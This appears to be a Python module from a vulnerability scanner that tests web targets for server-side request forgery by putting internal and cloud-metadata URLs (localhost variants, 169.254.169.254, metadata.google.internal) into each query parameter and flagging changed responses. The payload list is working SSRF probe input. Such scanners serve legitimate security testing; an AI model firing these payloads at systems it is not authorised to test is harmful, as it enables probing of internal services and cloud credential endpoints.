"""SSRF Testing Module — Server-Side Request Forgery detection."""

from __future__ import annotations
from typing import Any
import httpx, structlog
from src.core.module_runner import VulnModule

logger = structlog.get_logger(__name__)

class SSRFModule(VulnModule):
    name = "ssrf_scanner"
    category = "ssrf"
    description = "Server-Side Request Forgery detection"

    PAYLOADS = [
        "http://127.0.0.1:80", "http://localhost", "http://[::1]",
        "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/", "http://0x7f000001",
        "http://2130706433", "http://127.1", "http://0",
    ]

    async def test(self, target: str, params: dict, auth: Any = None,
                   hypothesis: dict | None = None) -> list[dict[str, Any]]:
        findings = []
        client = httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False)
        try:
            base_resp = await client.get(target, params=params or {})
            for payload in self.PAYLOADS:
                for param in (params or {}):
                    p = dict(params or {})
                    p[param] = payload
                    try:
                        resp = await client.get(target, params=p)
                        if resp.status_code != base_resp.status_code and resp.status_code == 200:
                            findings.append({
                                "title": f"Potential SSRF via '{param}'",
                                "description": f"Server responded differently to internal URL: {payload}",
                                "severity": "high", "category": "ssrf",
                                "affected_url": target, "param": param,
                                "confidence": 0.65,
                                "evidence": {"payload": payload, "status": resp.status_code,
                                             "body_length": len(resp.text)},
                                "source_tool": self.name,
                            })
                    except Exception:
                        pass
        finally:
            await client.aclose()
        return findings
